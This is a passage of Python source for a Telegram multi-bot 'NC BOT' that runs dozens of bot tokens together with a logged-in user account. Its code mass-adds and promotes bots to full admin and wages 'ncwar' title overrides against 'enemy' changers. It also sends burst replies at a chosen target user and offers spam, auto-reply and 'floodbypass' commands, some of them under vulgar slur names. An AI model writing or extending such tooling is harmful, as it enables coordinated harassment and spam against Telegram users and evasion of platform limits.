        return await update.message.reply_text("❌ User account not connected.")
    chat_id  = update.effective_chat.id
    wait_msg = await update.message.reply_text("⏳ Adding all bots…")
    results: List[str] = []
    for bot in all_bot_instances:
        try:
            me    = await bot.get_me()
            uname = me.username
            if not uname:
                continue
            await client.add_chat_members(chat_id, uname)
            results.append(f"✅ @{uname}")
            await asyncio.sleep(0.5)
        except UserAlreadyParticipant:
            try:
                me = await bot.get_me()
                results.append(f"ℹ️ @{me.username} already in")
            except Exception:
                pass
        except Exception as e:
            try:
                me = await bot.get_me()
                results.append(f"❌ @{me.username}: {type(e).__name__}")
            except Exception:
                results.append(f"❌ Bot error: {type(e).__name__}")
    await wait_msg.edit_text(
        "👥 Add All Bots:\n" + ("\n".join(results) if results else "No results.")
    )


async def promotebot_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    /promotebot @username  or reply to a bot message → promote as full admin.
    """
    if not update.effective_user or not is_admin(update.effective_user.id):
        return
    if not update.effective_chat or not update.message or not _is_primary_bot(context):
        return
    client = await _get_pyro()
    if not client:
        return await update.message.reply_text("❌ User account not connected.")
    chat_id = update.effective_chat.id
    usernames: List[str] = []
    if context.args:
        usernames = [u.lstrip("@") for u in context.args]
    elif (update.message.reply_to_message
          and update.message.reply_to_message.from_user
          and update.message.reply_to_message.from_user.username):
        usernames = [update.message.reply_to_message.from_user.username]
    if not usernames:
        return await update.message.reply_text(
            "Usage: /promotebot @username  or reply to a bot message"
        )
    _full_admin = ChatPrivileges(
        can_manage_chat=True,
        can_change_info=True,
        can_delete_messages=True,
        can_invite_users=True,
        can_restrict_members=True,
        can_pin_messages=True,
        can_promote_members=True,
        can_manage_video_chats=True,
        is_anonymous=False,
    )
    results: List[str] = []
    for uname in usernames:
        try:
            await client.promote_chat_member(chat_id, uname, privileges=_full_admin)
            results.append(f"✅ @{uname} promoted")
        except ChatAdminRequired:
            results.append(f"❌ @{uname}: I'm not admin here")
        except Exception as e:
            results.append(f"❌ @{uname}: {type(e).__name__}")
    await update.message.reply_text("👑 Promote Bot:\n" + "\n".join(results))


async def promoteallbots_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    /promoteallbots — Promote ALL configured bots as full admins.
    """
    if not update.effective_user or not is_admin(update.effective_user.id):
        return
    if not update.effective_chat or not update.message or not _is_primary_bot(context):
        return
    client = await _get_pyro()
    if not client:
        return await update.message.reply_text("❌ User account not connected.")
    chat_id  = update.effective_chat.id
    wait_msg = await update.message.reply_text("⏳ Promoting all bots…")
    _full_admin = ChatPrivileges(
        can_manage_chat=True,
        can_change_info=True,
        can_delete_messages=True,
        can_invite_users=True,
        can_restrict_members=True,
        can_pin_messages=True,
        can_promote_members=True,
        can_manage_video_chats=True,
        is_anonymous=False,
    )
    results: List[str] = []
    for bot in all_bot_instances:
        try:
            me    = await bot.get_me()
            uname = me.username
            if not uname:
                continue
            await client.promote_chat_member(chat_id, uname, privileges=_full_admin)
            results.append(f"✅ @{uname}")
            await asyncio.sleep(0.3)
        except Exception as e:
            try:
                me = await bot.get_me()
                results.append(f"❌ @{me.username}: {type(e).__name__}")
            except Exception:
                results.append(f"❌ Bot: {type(e).__name__}")
    await wait_msg.edit_text(
        "👑 Promote All Bots:\n" + ("\n".join(results) if results else "No results.")
    )


async def kickbot_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    /kickbot @username  or reply to a bot message → kick (ban+unban) from group.
    """
    if not update.effective_user or not is_admin(update.effective_user.id):
        return
    if not update.effective_chat or not update.message or not _is_primary_bot(context):
        return
    client = await _get_pyro()
    if not client:
        return await update.message.reply_text("❌ User account not connected.")
    chat_id = update.effective_chat.id
    usernames: List[str] = []
    if context.args:
        usernames = [u.lstrip("@") for u in context.args]
    elif (update.message.reply_to_message
          and update.message.reply_to_message.from_user
          and update.message.reply_to_message.from_user.username):
        usernames = [update.message.reply_to_message.from_user.username]
    if not usernames:
        return await update.message.reply_text(
            "Usage: /kickbot @username  or reply to a bot message"
        )
    results: List[str] = []
    for uname in usernames:
        try:
            await client.ban_chat_member(chat_id, uname)
            await asyncio.sleep(0.4)
            await client.unban_chat_member(chat_id, uname)
            results.append(f"✅ @{uname} kicked")
        except UserNotParticipant:
            results.append(f"ℹ️ @{uname} not in group")
        except Exception as e:
            results.append(f"❌ @{uname}: {type(e).__name__}")
    await update.message.reply_text("🦶 Kick Bot:\n" + "\n".join(results))


async def kickallbots_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    /kickallbots — Kick ALL configured bots from this group.
    """
    if not update.effective_user or not is_admin(update.effective_user.id):
        return
    if not update.effective_chat or not update.message or not _is_primary_bot(context):
        return
    client = await _get_pyro()
    if not client:
        return await update.message.reply_text("❌ User account not connected.")
    chat_id  = update.effective_chat.id
    wait_msg = await update.message.reply_text("⏳ Kicking all bots…")
    results: List[str] = []
    for bot in all_bot_instances:
        try:
            me    = await bot.get_me()
            uname = me.username
            if not uname:
                continue
            await client.ban_chat_member(chat_id, uname)
            await asyncio.sleep(0.3)
            await client.unban_chat_member(chat_id, uname)
            results.append(f"✅ @{uname} kicked")
        except Exception as e:
            try:
                me = await bot.get_me()
                results.append(f"❌ @{me.username}: {type(e).__name__}")
            except Exception:
                results.append(f"❌ Bot: {type(e).__name__}")
    await wait_msg.edit_text(
        "🦶 Kick All Bots:\n" + ("\n".join(results) if results else "No results.")
    )


async def creategc_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    /creategc <group name>
    Creates a new Telegram group using your user account,
    invites all configured bots, and sends the invite link here.
    """
    if not update.effective_user or not is_admin(update.effective_user.id):
        return
    if not update.effective_chat or not update.message or not _is_primary_bot(context):
        return
    client = await _get_pyro()
    if not client:
        return await update.message.reply_text(
            "❌ User account not connected.\nSetup: /setapi → /userlogin → /userotp"
        )
    gc_name = " ".join(context.args).strip() if context.args else ""
    if not gc_name:
        return await update.message.reply_text("Usage: /creategc <group name>")
    wait_msg = await update.message.reply_text(f"⏳ Creating group \"{gc_name}\"…")
    bot_usernames: List[str] = []
    for bot in all_bot_instances:
        try:
            me = await bot.get_me()
            if me.username:
                bot_usernames.append(me.username)
        except Exception:
            pass
    try:
        first_batch = bot_usernames[:1] if bot_usernames else []
        group = await client.create_group(gc_name, first_batch if first_batch else [])
        new_chat_id = group.id
        added: List[str] = []
        if first_batch:
            added.append(f"✅ @{first_batch[0]}")
        for uname in bot_usernames[1:]:
            try:
                await client.add_chat_members(new_chat_id, uname)
                added.append(f"✅ @{uname}")
                await asyncio.sleep(0.5)
            except UserAlreadyParticipant:
                added.append(f"ℹ️ @{uname} already in")
            except Exception as e:
                added.append(f"❌ @{uname}: {type(e).__name__}")
        try:
            link = await client.export_chat_invite_link(new_chat_id)
        except Exception:
            raw_id = str(new_chat_id).replace("-100", "")
            link = f"https://t.me/c/{raw_id}"
        bots_info = "\n".join(added) if added else "No bots added"
        reply = (
            f"🎉 Group Created!\n"
            f"📛 Name: **{gc_name}**\n"
            f"🔗 Link: {link}\n\n"
            f"🤖 Bots added:\n{bots_info}\n\n"
            f"💦 𝘣𝘺 𝐒𝐚𝐬𝐮𝐤𝐞 ⚡"
        )
        await wait_msg.edit_text(reply, parse_mode="Markdown")
    except Exception as e:
        await wait_msg.edit_text(f"❌ Failed to create group: {e}")


def _extract_base(raw: str, prefixes: tuple, context) -> str:
    for prefix in prefixes:
        if raw.lower().startswith(prefix.lower()):
            return raw[len(prefix):].strip()
    return " ".join(context.args) if context.args else ""


_SAAVN_MIRRORS = [
    "https://saavn.dev/api/search/songs?query={q}&page=1&limit=3",
    "https://saavn-api-privateciy.vercel.app/api/search/songs?query={q}&page=1&limit=3",
    "https://saavnapi-six.vercel.app/api/search/songs?query={q}&page=1&limit=3",
]

def _saavn_search_sync(query: str):
    q = urllib.parse.quote(query)
    headers = {"User-Agent": "Mozilla/5.0"}
    data = None
    last_err = None
    for mirror in _SAAVN_MIRRORS:
        try:
            url = mirror.format(q=q)
            req = urllib.request.Request(url, headers=headers)
            with urllib.request.urlopen(req, timeout=8) as r:
                data = json.loads(r.read())
            break
        except Exception as e:
            last_err = e
            continue
    if data is None:
        raise Exception(f"All mirrors failed. Last error: {last_err}")
    results = data.get("data", {}).get("results", [])
    if not results:
        return None
    song = results[0]
    dl_list = song.get("downloadUrl") or []
    dl_url = None
    for quality in ("320kbps", "160kbps", "96kbps"):
        for entry in dl_list:
            if entry.get("quality") == quality:
                dl_url = entry.get("url")
                break
        if dl_url:
            break
    if not dl_url and dl_list:
        dl_url = dl_list[-1].get("url")
    if not dl_url:
        return None
    title = song.get("name", "Unknown")
    artists_raw = song.get("artists") or {}
    if isinstance(artists_raw, dict):
        primary = artists_raw.get("primary") or []
        artist = ", ".join(a.get("name", "") for a in primary) if primary else "Unknown"
    elif isinstance(artists_raw, str):
        artist = artists_raw
    else:
        artist = "Unknown"
    duration = int(song.get("duration") or 0)
    return {"title": title, "artist": artist, "duration": duration, "url": dl_url}


def _download_audio_sync(url: str) -> bytes:
    """Blocking download — run inside executor."""
    req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
    with urllib.request.urlopen(req, timeout=30) as r:
        return r.read()


async def song_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    +song <song name>  or  /song <song name>
    Searches JioSaavn, downloads the best quality MP3, and sends as audio.
    """
    if not update.effective_user or not is_admin(update.effective_user.id):
        return
    if not update.effective_chat or not update.message:
        return
    if not _is_primary_bot(context):
        return

    raw = (update.message.text or "").strip()
    query = _extract_base(raw, ("+song", "💦song", "/song"), context)
    if not query:
        return await update.message.reply_text(
            "Usage: +song <song name>\nExample: +song Believer Imagine Dragons"
        )

    searching_msg = await update.message.reply_text(f"🔍 Searching: {query}…")
    loop = asyncio.get_event_loop()

    try:
        info = await loop.run_in_executor(None, _saavn_search_sync, query)
    except Exception as e:
        await searching_msg.edit_text(f"❌ Search failed: {e}")
        return

    if not info:
        await searching_msg.edit_text("❌ Song not found on JioSaavn. Try a different name.")
        return

    await searching_msg.edit_text(
        f"🎵 Found: *{info['title']}* — {info['artist']}\n⬇️ Downloading…",
        parse_mode="Markdown",
    )

    try:
        audio_bytes = await asyncio.wait_for(
            loop.run_in_executor(None, _download_audio_sync, info["url"]),
            timeout=45,
        )
    except asyncio.TimeoutError:
        await searching_msg.edit_text("❌ Download timed out. Try again.")
        return
    except Exception as e:
        await searching_msg.edit_text(f"❌ Download failed: {e}")
        return

    audio_file = io.BytesIO(audio_bytes)
    audio_file.name = f"{info['title'][:40]}.mp3"

    bot = all_bot_instances[0] if all_bot_instances else context.bot
    try:
        await bot.send_audio(
            chat_id=update.effective_chat.id,
            audio=audio_file,
            title=info["title"],
            performer=info["artist"],
            duration=info["duration"] or None,
            caption=f"🎵 *{info['title']}*\n👤 {info['artist']}\n\n𝐁ʏ Rexxy - X !! 🥀",
            parse_mode="Markdown",
        )
        await searching_msg.delete()
    except Exception as e:
        await searching_msg.edit_text(f"❌ Failed to send audio: {e}")


async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message or not update.message.from_user or not update.effective_chat:
        return

    chat_id = update.effective_chat.id
    known_chats.add(chat_id)
    uid = update.message.from_user.id
    msg = (update.message.text or "").strip()
    msg_lower = msg.lower()

    if chat_id in mute_chats and not is_admin(uid):
        try:
            await update.message.delete()
        except Exception:
            pass
        return

    if chat_id in autoreact_chats and update.message.message_id:
        style = autoreact_chats[chat_id]
        react_bots = [b for b in all_bot_instances if b is not None] or [context.bot]
        asyncio.create_task(_do_react(react_bots, chat_id, update.message.message_id, style))

    if msg_lower.startswith("+horneync") or msg_lower.startswith("💦horneync"):
        if is_admin(uid):
            await horneync_handler(update, context)
        return

    if msg_lower.startswith("+ohyesnc") or msg_lower.startswith("💦ohyesnc"):
        if is_admin(uid):
            await ohyesnc_handler(update, context)
        return

    if msg_lower.startswith("+stealthnc") or msg_lower.startswith("💦stealthnc"):
        if is_admin(uid):
            await stealthnc_handler(update, context)
        return

    if msg_lower.startswith("+lundnc") or msg_lower.startswith("💦lundnc"):
        if is_admin(uid):
            await lundnc_handler(update, context)
        return

    if msg_lower.startswith("+bhosdanc") or msg_lower.startswith("💦bhosdanc"):
        if is_admin(uid):
            await bhosdanc_handler(update, context)
        return

    if msg_lower.startswith("+areync") or msg_lower.startswith("💦areync"):
        if is_admin(uid):
            await areync_handler(update, context)
        return

    if msg_lower.startswith("+hatnc") or msg_lower.startswith("💦hatnc"):
        if is_admin(uid):
            await hatnc_handler(update, context)
        return

    if msg_lower.startswith("+😭nc") or msg_lower.startswith("💦😭nc") or msg_lower.startswith("+crync") or msg_lower.startswith("💦crync"):
        if is_admin(uid):
            await crync_handler(update, context)
        return

    if msg_lower.startswith("+arnavnc") or msg_lower.startswith("💦arnavnc"):
        if is_admin(uid):
            await arnavnc_handler(update, context)
        return

    if msg_lower.startswith("+kentonc") or msg_lower.startswith("💦kentonc"):
        if is_admin(uid):
            await kentonc_handler(update, context)
        return

    if msg_lower.startswith("+cr7nc") or msg_lower.startswith("💦cr7nc"):
        if is_admin(uid):
            await cr7nc_handler(update, context)
        return

    if msg_lower.startswith("+tripnc") or msg_lower.startswith("💦tripnc"):
        if is_admin(uid):
            await tripnc_handler(update, context)
        return

    if msg_lower.startswith("+ultranc") or msg_lower.startswith("💦ultranc"):
        if is_admin(uid):
            await ultranc_handler(update, context)
        return

    if msg_lower.startswith("+infernc")  or msg_lower.startswith("💦infernc"):
        if is_admin(uid): await infernc_handler(update, context)
        return
    if msg_lower.startswith("+voidnc")   or msg_lower.startswith("💦voidnc"):
        if is_admin(uid): await voidnc_handler(update, context)
        return
    if msg_lower.startswith("+stormnc")  or msg_lower.startswith("💦stormnc"):
        if is_admin(uid): await stormnc_handler(update, context)
        return
    if msg_lower.startswith("+bloodnc")  or msg_lower.startswith("💦bloodnc"):
        if is_admin(uid): await bloodnc_handler(update, context)
        return
    if msg_lower.startswith("+divinenc") or msg_lower.startswith("💦divinenc"):
        if is_admin(uid): await divinenc_handler(update, context)
        return

    if msg_lower.startswith("+Godx10") or msg_lower.startswith("💦Godx10"):
        if is_admin(uid): await Godx10_handler(update, context)
        return
    if msg_lower.startswith("+Godx1")  or msg_lower.startswith("💦Godx1"):
        if is_admin(uid): await Godx1_handler(update, context)
        return
    if msg_lower.startswith("+Godx2")  or msg_lower.startswith("💦Godx2"):
        if is_admin(uid): await Godx2_handler(update, context)
        return
    if msg_lower.startswith("+Godx3")  or msg_lower.startswith("💦Godx3"):
        if is_admin(uid): await Godx3_handler(update, context)
        return
    if msg_lower.startswith("+Godx4")  or msg_lower.startswith("💦Godx4"):
        if is_admin(uid): await Godx4_handler(update, context)
        return
    if msg_lower.startswith("+Godx5")  or msg_lower.startswith("💦Godx5"):
        if is_admin(uid): await Godx5_handler(update, context)
        return
    if msg_lower.startswith("+Godx6")  or msg_lower.startswith("💦Godx6"):
        if is_admin(uid): await Godx6_handler(update, context)
        return
    if msg_lower.startswith("+Godx7")  or msg_lower.startswith("💦Godx7"):
        if is_admin(uid): await Godx7_handler(update, context)
        return
    if msg_lower.startswith("+Godx8")  or msg_lower.startswith("💦Godx8"):
        if is_admin(uid): await Godx8_handler(update, context)
        return
    if msg_lower.startswith("+Godx9")  or msg_lower.startswith("💦Godx9"):
        if is_admin(uid): await Godx9_handler(update, context)
        return

    if msg_lower.startswith("+aiimg") or msg_lower.startswith("💦aiimg"):
        if is_admin(uid):
            await aiimg_cmd(update, context)
        return

    if msg_lower.startswith("+purenc") or msg_lower.startswith("💦purenc"):
        if is_admin(uid):
            await purenc_handler(update, context)
        return

    if msg_lower.startswith("+randnc") or msg_lower.startswith("💦randnc"):
        if is_admin(uid):
            await randnc_handler(update, context)
        return

    if msg_lower.startswith("+burnc") or msg_lower.startswith("💦burnc"):
        if is_admin(uid):
            await burnc_handler(update, context)
        return

    if msg_lower.startswith("+aahnc") or msg_lower.startswith("💦aahnc"):
        if is_admin(uid):
            await aahnc_handler(update, context)
        return

    if msg_lower.startswith("+ncwar") or msg_lower.startswith("💦ncwar"):
        if is_admin(uid):
            await ncwar_cmd(update, context)
        return

    if msg_lower.startswith("+autoreact") or msg_lower.startswith("💦autoreact"):
        if is_admin(uid):
            await autoreact_cmd(update, context)
        return

    if msg_lower.startswith("+heartreact") or msg_lower.startswith("💦heartreact"):
        if is_admin(uid):
            await heartreact_cmd(update, context)
        return

    if msg_lower.startswith("+boomreact") or msg_lower.startswith("💦boomreact"):
        if is_admin(uid):
            await boomreact_cmd(update, context)
        return

    if msg_lower.startswith("+customreact") or msg_lower.startswith("💦customreact"):
        if is_admin(uid):
            await customreact_cmd(update, context)
        return

    if msg_lower.startswith("+song") or msg_lower.startswith("💦song"):
        if is_admin(uid):
            await song_cmd(update, context)
        return

    if msg_lower.startswith("+slidereply") or msg_lower.startswith("💦slidereply"):
        if is_admin(uid):
            await slidereply_cmd(update, context)
        return

    if msg_lower.startswith("+slide") and not msg_lower.startswith("+slidereply"):
        if is_admin(uid):
            await plus_slide(update, context)
        return

    if msg_lower.startswith("+spam") or msg_lower.startswith("💦spam"):
        if is_admin(uid):
            await spam_cmd(update, context)
        return

    if msg_lower.startswith("+autoreply") or msg_lower.startswith("💦autoreply"):
        if is_admin(uid):
            await autoreply_cmd(update, context)
        return

    if msg_lower.startswith("+targetreply") or msg_lower.startswith("💦targetreply"):
        if is_admin(uid):
            await targetreply_cmd(update, context)
        return

    if chat_id in autoreply_chats and not is_admin(uid):
        reply_text = autoreply_chats[chat_id]
        bot = all_bot_instances[0] if all_bot_instances else context.bot
        async def _do_autoreply():
            try:
                await bot.send_message(
                    chat_id,
                    reply_text,
                    reply_to_message_id=update.message.message_id,
                )
            except Exception:
                pass
        asyncio.create_task(_do_autoreply())

    tr = targetreply_chats.get(chat_id)
    if tr and uid == tr["uid"] and not is_admin(uid):
        reply_text = tr["text"]
        bot = all_bot_instances[0] if all_bot_instances else context.bot
        async def _do_targetreply():
            try:
                await bot.send_message(
                    chat_id,
                    reply_text,
                    reply_to_message_id=update.message.message_id,
                )
            except Exception:
                pass
        asyncio.create_task(_do_targetreply())

    target_uid = slide_reply_targets.get(chat_id)
    if target_uid and uid == target_uid and not is_admin(uid):
        bots = [b for b in all_bot_instances if b is not None] or [context.bot]
        mid = update.message.message_id
        async def _bot_burst(bot):
            await _slide_reply_burst(bot, chat_id, mid, count=5)
        asyncio.create_task(
            asyncio.gather(*[_bot_burst(b) for b in bots], return_exceptions=True)
        )


async def title_change_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    Fires on every NEW_CHAT_TITLE service message.

    1. ncdel ON → delete the service message (makes enemy NC invisible).
    2. ncwar ON → override enemy title back to our text immediately.

    Both can be active simultaneously.
    Only primary bot acts to avoid duplicate actions.
    """
    if not update.message or not update.effective_chat:
        return

    chat_id = update.effective_chat.id
    changer = update.message.from_user

    if chat_id in ncdel_chats:
        changer_id = changer.id if changer else 0
        our_bot_ids = {getattr(b, "id", 0) for b in all_bot_instances if b}
        if changer_id not in our_bot_ids and not is_admin(changer_id):
            try:
                await update.message.delete()
            except Exception:
                pass

    if chat_id in ncwar_targets and _is_primary_bot(context):
        changer_id = changer.id if changer else 0
        our_bot_ids = {getattr(b, "id", 0) for b in all_bot_instances if b}
        if changer_id not in our_bot_ids:
            base = ncwar_targets[chat_id]
            bots = [b for b in all_bot_instances if b is not None] or [context.bot]
            name = _build_name(base, [""])

            async def _override(bot):
                try:
                    await bot.set_chat_title(chat_id, name)
                except Exception:
                    pass

            await asyncio.gather(*[_override(bot) for bot in bots], return_exceptions=True)


def _register_handlers(app):
    cmds = {
        "start":       start_cmd,
        "help":        help_cmd,
        "stop":        stop_cmd,
        "addsudo":     addsudo_cmd,
        "removesudo":  removesudo_cmd,
        "sudolist":    sudolist_cmd,
        "bots":        bots_info_cmd,
        "leave":       leave_cmd,
        "mute":        mute_cmd,
        "ncdel":       ncdel_cmd,
        "ncwar":       ncwar_cmd,
        "stopncwar":   stopncwar_cmd,
        "gclist":      gclist_cmd,
        "restrict":        restrict_cmd,
        "unrestrict":      unrestrict_cmd,
        "stopreact":       stopreact_cmd,
        "setmenuphoto":    setmenuphoto_cmd,
        "setmenuvideo":    setmenuvideo_cmd,
        "clearmenu":       clearmenu_cmd,
        "slidereply":         slidereply_cmd,
        "stopslidereply":     stopslidereply_cmd,
        "slide":              plus_slide,
        "spam":               spam_cmd,
        "stopspam":           stopspam_cmd,
        "autoreply":          autoreply_cmd,
        "stopautoreply":      stopautoreply_cmd,
        "targetreply":        targetreply_cmd,
        "stoptargetreply":    stoptargetreply_cmd,
        "customreact":        customreact_cmd,
        "song":               song_cmd,
        "floodbypass":        floodbypass_cmd,
        "setapi":             setapi_cmd,
        "userlogin":          userlogin_cmd,
        "userotp":            userotp_cmd,
        "user2fa":            user2fa_cmd,
        "userlogout":         userlogout_cmd,
        "userstatus":         userstatus_cmd,
        "addbot":             addbot_cmd,
        "addallbots":         addallbots_cmd,
        "promotebot":         promotebot_cmd,
        "promoteallbots":     promoteallbots_cmd,
        "kickbot":            kickbot_cmd,
        "kickallbots":        kickallbots_cmd,
        "creategc":           creategc_cmd,
        "randnc":      randnc_handler,
        "burnc":       burnc_handler,
        "ohyesnc":     ohyesnc_handler,
        "aahnc":       aahnc_handler,
        "horneync":    horneync_handler,
        "Horneync":    horneync_handler,
        "purenc":      purenc_handler,
        "stealthnc":   stealthnc_handler,
        "lundnc":      lundnc_handler,
        "Lundnc":      lundnc_handler,
        "bhosdanc":    bhosdanc_handler,
        "Bhosdanc":    bhosdanc_handler,
        "areync":      areync_handler,
        "hatnc":       hatnc_handler,
        "crync":       crync_handler,
        "aiimg":       aiimg_cmd,
        "arnavnc":     arnavnc_handler,
        "kentonc":     kentonc_handler,
        "cr7nc":       cr7nc_handler,
        "tripnc":      tripnc_handler,
        "ultranc":     ultranc_handler,
        "infernc":     infernc_handler,
        "voidnc":      voidnc_handler,
        "stormnc":     stormnc_handler,
        "bloodnc":     bloodnc_handler,
        "divinenc":    divinenc_handler,
        "Godx1":     Godx1_handler,
        "Godx2":     Godx2_handler,
        "Godx3":     Godx3_handler,
        "Godx4":     Godx4_handler,
        "Godx5":     Godx5_handler,
        "Godx6":     Godx6_handler,
        "Godx7":     Godx7_handler,
        "Godx8":     Godx8_handler,
        "Godx9":     Godx9_handler,
        "Godx10":    Godx10_handler,
    }
    for cmd, h in cmds.items():
        if callable(h):
            app.add_handler(CommandHandler(cmd, _dedup(h)))

    app.add_handler(MessageHandler(
        filters.StatusUpdate.NEW_CHAT_TITLE,
        title_change_handler
    ))

    app.add_handler(MessageHandler(
        filters.TEXT & ~filters.COMMAND,
        _dedup(message_handler)
    ))


async def run_bots():
    global all_bot_instances, all_apps

    all_tokens = get_base_tokens() + [
        t for t in extra_tokens if t not in get_base_tokens()
    ]
    print(f"🚀 Starting {len(all_tokens)} bots... (💦 NC BOT)")

    from telegram.request import HTTPXRequest
    req_cfg = HTTPXRequest(
        connection_pool_size=500,
        read_timeout=30,
        write_timeout=30,
        connect_timeout=30,
        pool_timeout=5,
    )

    apps = []
    for token in all_tokens:
        if "YOUR_BOT" in token:
            continue
        try:
            app = Application.builder().token(token).request(req_cfg).build()
            _register_handlers(app)
            await app.initialize()
            await app.start()
            if app.updater:
                await app.updater.start_polling(drop_pending_updates=True)
            apps.append(app)
            all_apps.append(app)
            try:
                me = await app.bot.get_me()
                print(f"✅ @{me.username} ready")
            except Exception:
                print(f"✅ Bot started (unknown username)")
        except Exception as e:
            print(f"❌ Token {token[:15]}...: {e}")

    all_bot_instances.clear()
    for app in apps:
        all_bot_instances.append(app.bot)

    print(f"🎯 {len(all_bot_instances)} bots online")
    print(f"💦 NC:    +randnc +burnc +ohyesnc +aahnc +Horneync +purenc +stealthnc")
    print(f"💦 Enemy: /ncdel /ncwar /stopncwar")
    print(f"💦 Chat:  /mute /restrict /unrestrict /gclist /leave")
    print(f"💦 React: +autoreact +heartreact +boomreact +customreact /stopreact")
    print(f"💦 Song:  +song <name>")
    print(f"💦 Slide: +slidereply /stopslidereply")
    print(f"💦 Menu:  /setmenuphoto /setmenuvideo /clearmenu")

    await _connect_pyro_from_saved()

    try:
        await asyncio.Event().wait()
    finally:
        for app in apps:
            try:
                await app.stop()
                await app.shutdown()
            except Exception:
                pass


if __name__ == "__main__":
    threading.Thread(target=run_health_check_server, daemon=True).start()
    try:
        asyncio.run(run_bots())
    except KeyboardInterrupt:
        pass
